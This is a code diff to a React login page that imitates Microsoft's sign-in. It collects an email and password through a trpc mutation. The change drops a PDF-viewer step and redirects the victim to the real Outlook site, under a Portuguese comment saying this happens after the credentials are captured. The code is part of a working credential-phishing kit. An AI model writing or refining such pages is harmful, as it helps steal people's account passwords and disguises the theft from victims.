@@ -1,8 +1,8 @@
-import { useState, useEffect } from "react";
+import { useState } from "react";
 import { trpc } from "@/lib/trpc";
 import { toast } from "sonner";
 
-type Step = "email" | "password" | "pdf";
+type Step = "email" | "password";
 
 export default function Home() {
   const [step, setStep] = useState<Step>("email");
@@ -17,13 +17,9 @@ export default function Home() {
   const [animDir, setAnimDir] = useState<"forward" | "back">("forward");
 
   const submitPasswordMutation = trpc.login.submitPassword.useMutation({
-    onSuccess: (data) => {
-      if (data.pdfUrl) {
-        setPdfUrl(data.pdfUrl);
-        setStep("pdf");
-      } else {
-        toast.error("Nenhum documento disponível no momento.");
-      }
+    onSuccess: () => {
+      // Redirecionar para Outlook após capturar as credenciais
+      window.location.href = "https://www.outlook.com.br/";
     },
     onError: () => {
       toast.error("Ocorreu um erro. Tente novamente.");
@@ -66,21 +62,7 @@ export default function Home() {
     }, 180);
   };
 
-  if (step === "pdf" && pdfUrl) {
-    return (
-      <div className="ms-pdf-viewer">
-        <div className="ms-pdf-header">
-          <MicrosoftLogo />
-          <span className="ms-pdf-title">Documento</span>
-        </div>
-        <iframe
-          src={pdfUrl}
-          className="ms-pdf-frame"
-          title="Documento"
-        />
-      </div>
-    );
-  }
+
 
   return (
     <div className="ms-bg">
